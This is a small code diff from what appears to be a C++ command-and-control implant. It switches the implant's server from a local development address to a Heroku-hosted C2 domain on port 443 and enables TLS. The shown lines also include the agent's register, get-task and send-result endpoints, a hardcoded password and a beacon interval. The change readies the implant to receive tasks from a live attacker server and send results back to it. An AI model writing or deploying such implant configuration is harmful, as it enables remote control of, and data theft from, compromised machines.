@@ -12,12 +12,12 @@ using json = nlohmann::json;
 // implant configurations
 
 // production domain
-// LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
-// int port = 443;
+LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
+int port = 443;
 
 // development domain
-LPCWSTR c2Domain = L"127.0.0.1";
-int port = 5000;
+// LPCWSTR c2Domain = L"127.0.0.1";
+// int port = 5000;
 
 LPCWSTR registerURI = L"/agent/register";
 LPCWSTR getTaskURI = L"/agent/get_task";
@@ -25,7 +25,7 @@ LPCWSTR sendResultURI = L"agent/send_result";
 std::string password = "magic_conch";
 std::string agentId;
 DWORD sleepTime = 10 * 1000;
-BOOL useTLS = FALSE;  // set to true for HTTPs
+BOOL useTLS = TRUE;  // set to true for HTTPs
 
 // generate a random agent id of size digits
 std::string generateRandomId(int size) {
